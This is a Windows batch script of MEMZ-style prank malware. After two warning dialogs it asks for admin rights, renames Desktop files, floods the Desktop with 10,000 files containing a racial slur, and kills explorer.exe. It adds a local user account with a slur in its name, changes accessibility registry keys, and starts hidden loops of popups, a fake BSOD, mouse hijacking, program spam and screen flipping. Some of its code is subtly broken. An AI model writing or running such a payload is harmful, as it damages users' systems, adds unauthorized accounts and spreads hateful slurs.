@echo off
setlocal enabledelayedexpansion

:: Hide the console window immediately (before any prompts)
powershell -WindowStyle Hidden -Command "$signature = '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; $type = Add-Type -MemberDefinition $signature -Name Win32ShowWindow -Namespace Win32Functions -PassThru; $consolePtr = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle; $type::ShowWindow($consolePtr, 0)" >nul 2>&1

:: First confirmation using message box
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('WARNING: This script is a virus, If you continue you will continue to a pc destructive program', 'Warning', 'YesNo', 'Warning')" > %temp%\msgbox1.txt
set /p result1=<%temp%\msgbox1.txt
del %temp%\msgbox1.txt

if not "%result1%"=="Yes" (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Operation cancelled by user.', 'Cancelled', 'OK', 'Information')" >nul
    exit /b
)

:: Second warning using message box
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('FINAL WARNING: Are you absolutely sure you want to proceed?^n^nThis action cannot be undone.', 'Final Warning', 'YesNo', 'Exclamation')" > %temp%\msgbox2.txt
set /p result2=<%temp%\msgbox2.txt
del %temp%\msgbox2.txt

if not "%result2%"=="Yes" (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Operation cancelled by user.', 'Cancelled', 'OK', 'Information')" >nul
    exit /b
)

echo.
echo Proceeding with script...
echo.



net session >nul 2>&1
if %errorlevel% == 0 (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Administrator privileges confirmed!^n^nProceeding with script execution...', 'Admin Check', 'OK', 'Information')" >nul
    echo.
    echo [Rest of script with admin privileges would go here]
    echo.
	ping 127.0.0.1 -n 2 >nul
	set /a count=20

for /l %%i in (1,1,%count%) do (
   start "" "https://www.youtube.com/watch?v=5oIi2M6y7G4&list=RD5oIi2M6y7G4"
   
   cd %USERPROFILE%\Desktop
ren *. *.GOOF

cd %USERPROFILE%\Desktop
for /l %i in (1,1,10000) do echo NIGA > CRYFORMEBOYYYY%i.txt

ping 127.0.0.1 -n 2 >nul

taskkill /f /im explorer.exe
ping 127.0.0.1 -n 2 >nul
net user /add whydidyouleavehimforaniggaeboy troll123

:: Set registry keys for inverted color filter (FilterType=1 for invert) - run once
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v "Configuration" /t REG_SZ /d "colorfiltering" /f
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\colorfiltering" /v "Active" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\colorfiltering" /v "FilterType" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "Active" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "FilterType" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "HotkeyEnabled" /t REG_DWORD /d 1 /f
ping 127.0.0.1 -n 2 >nul
start "" explorer.exe

echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing > %temp%\cursor_trail.ps1
echo $form = New-Object System.Windows.Forms.Form >> %temp%\cursor_trail.ps1
echo $form.Text = 'Cursor Trail Overlay' >> %temp%\cursor_trail.ps1
echo $form.TopMost = $true >> %temp%\cursor_trail.ps1
echo $form.FormBorderStyle = 'None' >> %temp%\cursor_trail.ps1
echo $form.WindowState = 'Maximized' >> %temp%\cursor_trail.ps1
echo $form.BackColor = [System.Drawing.Color]::Magenta >> %temp%\cursor_trail.ps1
echo $form.TransparencyKey = [System.Drawing.Color]::Magenta >> %temp%\cursor_trail.ps1
echo $trails = New-Object System.Collections.Queue >> %temp%\cursor_trail.ps1
echo $icon = [System.Drawing.SystemIcons]::Error >> %temp%\cursor_trail.ps1
echo $timer = New-Object System.Windows.Forms.Timer >> %temp%\cursor_trail.ps1
echo $timer.Interval = 50  # Faster update for smoother trail (~20 FPS) >> %temp%\cursor_trail.ps1
echo $timer.Add_Tick({ >> %temp%\cursor_trail.ps1
echo   $pos = [System.Windows.Forms.Cursor]::Position >> %temp%\cursor_trail.ps1
echo   $trails.Enqueue($pos) >> %temp%\cursor_trail.ps1
echo   if ($trails.Count -gt 20) { $trails.Dequeue() }  # Trail length: 20 icons >> %temp%\cursor_trail.ps1
echo   $form.Invalidate() >> %temp%\cursor_trail.ps1
echo }) >> %temp%\cursor_trail.ps1
echo $form.Add_Paint({ >> %temp%\cursor_trail.ps1
echo   $g = $_.Graphics >> %temp%\cursor_trail.ps1
echo   $i = 0 >> %temp%\cursor_trail.ps1
echo   foreach ($p in $trails.ToArray()) { >> %temp%\cursor_trail.ps1
echo     $alpha = [math]::Max(0, 255 - ($i * 12))  # Fade out effect >> %temp%\cursor_trail.ps1
echo     if ($alpha -gt 0) { >> %temp%\cursor_trail.ps1
echo       $g.DrawIcon($icon, $p.X - $form.Left - 16, $p.Y - $form.Top - 16)  # Offset to center icon >> %temp%\cursor_trail.ps1
echo     } >> %temp%\cursor_trail.ps1
echo     $i++ >> %temp%\cursor_trail.ps1
echo   } >> %temp%\cursor_trail.ps1
echo }) >> %temp%\cursor_trail.ps1
echo $form.Show() >> %temp%\cursor_trail.ps1
echo $timer.Start() >> %temp%\cursor_trail.ps1
echo [System.Windows.Forms.Application]::Run($form) >> %temp%\cursor_trail.ps1
:: Run the PowerShell script hidden
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %temp%\cursor_trail.ps1
ping 127.0.0.1 -n 2 >nul
goto loopdaddy

:rest1
start "" "https://www.youtube.com/watch?v=1OW5Yr_NaUY&list=RD1OW5Yr_NaUY&start_radio=1"
start "" "https://www.youtube.com/watch?v=1OW5Yr_NaUY&list=RD1OW5Yr_NaUY&start_radio=1"
start "" "https://www.youtube.com/watch?v=nebNhtYSlFw&list=RDEMF7GeOhMDXItb2tMUwT2zNQ&start_radio=1&rv=1OW5Yr_NaUY"
pause





:loopdaddy
REM Create beep loop batch file
(
echo @echo off
echo :beep_loop
echo rundll32.exe user32.dll,MessageBeep -1
echo ping 127.0.0.1 -n 2 ^>nul
echo rundll32.exe user32.dll,MessageBeep 16
echo ping 127.0.0.1 -n 2 ^>nul
echo rundll32.exe user32.dll,MessageBeep 48
echo ping 127.0.0.1 -n 2 ^>nul
echo rundll32.exe user32.dll,MessageBeep 64
echo goto beep_loop
) > %temp%\beep.bat

REM Create program spam batch file
(
echo @echo off
echo :program_spam
echo start notepad.exe
echo start calc.exe
echo start mspaint.exe
echo start cmd.exe
echo ping 127.0.0.1 -n 3 ^>nul
echo goto program_spam
) > %temp%\ps.bat

REM Create popup spam batch file
(
echo @echo off
echo setlocal enabledelayedexpansion
echo :popup_spam
echo set "msgs[0]=Your computer has been trashed by the MEMZ Trojan."
echo set "msgs[1]=You are an idiot! HAHAHAHA"
echo set "msgs[2]=Payload executed successfully."
echo set "msgs[3]=Error: Keyboard not found. Press F1 to continue."
echo set "msgs[4]=NYAN CAT APPROVES"
echo set "msgs[5]=Good luck closing all of these!"
echo set "msgs[6]=Windows will now restart in 10... 9... ^(jk^)"
echo set "msgs[7]=TROJAN.MEMZ.DESTRUCTIVE"
echo set /a "rand=!random! %%%% 8"
echo echo Set objShell = CreateObject^("WScript.Shell"^) ^> %%temp%%\popup.vbs
echo echo objShell.Popup "%%msgs[!rand!]%%", 0, "Windows Error", 16 + 4096 ^>^> %%temp%%\popup.vbs
echo cscript //nologo %%temp%%\popup.vbs
echo del %%temp%%\popup.vbs
echo ping 127.0.0.1 -n 3 ^>nul
echo goto popup_spam
) > %temp%\popup.bat

REM Create fake BSOD batch file
(
echo @echo off
echo :fakebsod
echo echo $form = New-Object System.Windows.Forms.Form ^> %%temp%%\fakebsod.ps1
echo echo $form.BackColor = '#0000ff' ^>^> %%temp%%\fakebsod.ps1
echo echo $form.FormBorderStyle = 'None' ^>^> %%temp%%\fakebsod.ps1
echo echo $form.WindowState = 'Maximized' ^>^> %%temp%%\fakebsod.ps1
echo echo $form.TopMost = $true ^>^> %%temp%%\fakebsod.ps1
echo echo $label = New-Object System.Windows.Forms.Label ^>^> %%temp%%\fakebsod.ps1
echo echo $label.Text = "A problem has been detected and Windows has been shut dow`n`nYOUR COMPUTER HAS BEEN TRASHED BY MEM`n`n:^(^^ Your PC ran into a problem`nPress Ctrl+Alt+Del to restart" ^>^> %%temp%%\fakebsod.ps1
echo echo $label.ForeColor = 'White' ^>^> %%temp%%\fakebsod.ps1
echo echo $label.Font = 'Consolas,20' ^>^> %%temp%%\fakebsod.ps1
echo echo $label.Dock = 'Fill' ^>^> %%temp%%\fakebsod.ps1
echo echo $label.TextAlign = 'MiddleCenter' ^>^> %%temp%%\fakebsod.ps1
echo echo $form.Controls.Add^($label^) ^>^> %%temp%%\fakebsod.ps1
echo echo $form.ShowDialog^(^) ^>^> %%temp%%\fakebsod.ps1
echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %%temp%%\fakebsod.ps1
echo ping 127.0.0.1 -n 5 ^>nul
echo goto fakebsod
) > %temp%\bsod.bat

REM Create mouse jiggling batch file
(
echo @echo off
echo :mousejiggling
echo echo Add-Type '[DllImport^("user32.dll"^)]public static extern bool SetCursorPos^(int x, int y^);' -Name "Win32" -Namespace "NativeMethods" -PassThru ^> %%temp%%\jiggle.ps1
echo echo while ^($true^) { ^>^> %%temp%%\jiggle.ps1
echo echo   $pos = [System.Windows.Forms.Cursor]::Position ^>^> %%temp%%\jiggle.ps1
echo echo   $x = $pos.X + ^(Get-Random -Minimum -20 -Maximum 21^) ^>^> %%temp%%\jiggle.ps1
echo echo   $y = $pos.Y + ^(Get-Random -Minimum -20 -Maximum 21^) ^>^> %%temp%%\jiggle.ps1
echo echo   [NativeMethods.Win32]::SetCursorPos^($x, $y^) ^>^> %%temp%%\jiggle.ps1
echo echo   Start-Sleep -Milliseconds 500 ^>^> %%temp%%\jiggle.ps1
echo echo } ^>^> %%temp%%\jiggle.ps1
echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %%temp%%\jiggle.ps1
echo goto mousejiggling
) > %temp%\mouse.bat

REM Create window shake/move spam batch file
(
echo @echo off
echo :window_shake
echo echo Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport^("user32.dll"^)] public static extern IntPtr GetForegroundWindow^(^); [DllImport^("user32.dll"^)] public static extern bool MoveWindow^(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint^); [DllImport^("user32.dll"^)] public static extern bool GetWindowRect^(IntPtr hWnd, out RECT lpRect^); public struct RECT { public int Left; public int Top; public int Right; public int Bottom; } }' ^> %%temp%%\shake.ps1
echo echo while ^($true^) { ^>^> %%temp%%\shake.ps1
echo echo   $hwnd = [Win32]::GetForegroundWindow^(^) ^>^> %%temp%%\shake.ps1
echo echo   $rect = New-Object Win32+RECT ^>^> %%temp%%\shake.ps1
echo echo   [Win32]::GetWindowRect^($hwnd, [ref]$rect^) ^>^> %%temp%%\shake.ps1
echo echo   $x = $rect.Left + ^(Get-Random -Minimum -50 -Maximum 51^) ^>^> %%temp%%\shake.ps1
echo echo   $y = $rect.Top + ^(Get-Random -Minimum -50 -Maximum 51^) ^>^> %%temp%%\shake.ps1
echo echo   $w = $rect.Right - $rect.Left ^>^> %%temp%%\shake.ps1
echo echo   $h = $rect.Bottom - $rect.Top ^>^> %%temp%%\shake.ps1
echo echo   [Win32]::MoveWindow^($hwnd, $x, $y, $w, $h, $true^) ^>^> %%temp%%\shake.ps1
echo echo   Start-Sleep -Seconds 2 ^>^> %%temp%%\shake.ps1
echo echo } ^>^> %%temp%%\shake.ps1
echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %%temp%%\shake.ps1
echo goto window_shake
) > %temp%\shake.bat

REM Create screen flip/rotate spam batch file
(
echo @echo off
echo :screen_flip
echo set /a "rotation=!random! %%%% 4"
echo if "%%rotation%%"=="0" ^(
echo   DisplaySwitch.exe /internal
echo   powershell -Command "Add-Type '[DllImport^(\"user32.dll\"^)]public static extern int SetDisplayConfig^(uint numPathArrayElements,IntPtr pathArray,uint numModeInfoArrayElements,IntPtr modeInfoArray,uint flags^);' -Name User32 -Namespace Win32; [Win32.User32]::SetDisplayConfig^(0,[IntPtr]::Zero,0,[IntPtr]::Zero,0x00000001^)"
echo ^) else if "%%rotation%%"=="1" ^(
echo   powershell -Command "$sig='[DllImport^(\"user32.dll\"^)]public static extern bool SetDisplayConfig^(uint n,IntPtr p,uint m,IntPtr i,uint f^);';Add-Type -M $sig -N u -Name a;[u.a]::SetDisplayConfig^(0,0,0,0,6^)"
echo ^) else if "%%rotation%%"=="2" ^(
echo   powershell -Command "$sig='[DllImport^(\"user32.dll\"^)]public static extern bool SetDisplayConfig^(uint n,IntPtr p,uint m,IntPtr i,uint f^);';Add-Type -M $sig -N u -Name b;[u.b]::SetDisplayConfig^(0,0,0,0,6^)"
echo ^) else ^(
echo   powershell -Command "$sig='[DllImport^(\"user32.dll\"^)]public static extern bool SetDisplayConfig^(uint n,IntPtr p,uint m,IntPtr i,uint f^);';Add-Type -M $sig -N u -Name c;[u.c]::SetDisplayConfig^(0,0,0,0,6^)"
echo ^)
echo ping 127.0.0.1 -n 3 ^>nul
echo goto screen_flip
) > %temp%\flip.bat

REM Create mouse click spam batch file
(
echo @echo off
echo :click_spam
echo echo Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport^("user32.dll"^)] public static extern void mouse_event^(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo^); public const uint LEFTDOWN = 0x0002; public const uint LEFTUP = 0x0004; }' ^> %%temp%%\click.ps1
echo echo while ^($true^) { ^>^> %%temp%%\click.ps1
echo echo   [Mouse]::mouse_event^([Mouse]::LEFTDOWN, 0, 0, 0, 0^) ^>^> %%temp%%\click.ps1
echo echo   Start-Sleep -Milliseconds 50 ^>^> %%temp%%\click.ps1
echo echo   [Mouse]::mouse_event^([Mouse]::LEFTUP, 0, 0, 0, 0^) ^>^> %%temp%%\click.ps1
echo echo   Start-Sleep -Milliseconds 200 ^>^> %%temp%%\click.ps1
echo echo } ^>^> %%temp%%\click.ps1
echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %%temp%%\click.ps1
echo goto click_spam
) > %temp%\click.bat

REM Create error sound spam batch file
(
echo @echo off
echo :error_sound
echo rundll32.exe user32.dll,MessageBeep 16
echo ping 127.0.0.1 -n 1 ^>nul
echo rundll32.exe user32.dll,MessageBeep 48
echo ping 127.0.0.1 -n 1 ^>nul
echo rundll32.exe user32.dll,MessageBeep 16
echo ping 127.0.0.1 -n 2 ^>nul
echo goto error_sound
) > %temp%\error.bat

REM Create VBS script to run all hidden
echo CreateObject("WScript.Shell").Run "%temp%\beep.bat", 0 > %temp%\run.vbs
echo CreateObject("WScript.Shell").Run "%temp%\ps.bat", 0 >> %temp%\run.vbs
echo CreateObject("WScript.Shell").Run "%temp%\popup.bat", 0 >> %temp%\run.vbs
echo CreateObject("WScript.Shell").Run "%temp%\bsod.bat", 0 >> %temp%\run.vbs
echo CreateObject("WScript.Shell").Run "%temp%\mouse.bat", 0 >> %temp%\run.vbs
REM Add to your existing run.vbs creation:
echo CreateObject("WScript.Shell").Run "%temp%\shake.bat", 0 >> %temp%\run.vbs
echo CreateObject("WScript.Shell").Run "%temp%\flip.bat", 0 >> %temp%\run.vbs
echo CreateObject("WScript.Shell").Run "%temp%\click.bat", 0 >> %temp%\run.vbs
echo CreateObject("WScript.Shell").Run "%temp%\error.bat", 0 >> %temp%\run.vbs



REM Launch everything hidden
start "" wscript.exe %temp%\run.vbs

goto rest1


	
) else (
    :: Show message box about needing admin rights
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Administrator privileges required!^n^nThe script will now restart with elevated permissions.', 'Admin Required', 'OK', 'Warning')" >nul
    
    :: Re-launch the script with admin rights
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)





